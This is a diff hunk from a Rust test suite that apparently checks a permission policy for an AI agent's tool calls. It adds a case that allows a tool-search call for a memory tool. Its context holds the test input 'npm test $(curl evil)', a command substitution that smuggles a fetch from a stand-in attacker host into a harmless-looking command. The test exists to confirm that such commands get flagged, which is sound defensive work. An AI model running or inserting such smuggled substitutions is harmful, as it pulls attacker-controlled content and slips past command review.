@@ -908,6 +908,10 @@ fn default_mode() {
         &p,
         &ToolCall::new("submit_implementer", json!({"status": "ok"})),
     );
+    allowed(
+        &p,
+        &ToolCall::new("Other:ToolSearch", json!({"query": "select:mcp__ostra__memory"})),
+    );
     assert!(
         is_ask(&p.check(&bash("npm test $(curl evil)"))),
         "substitutions run too"
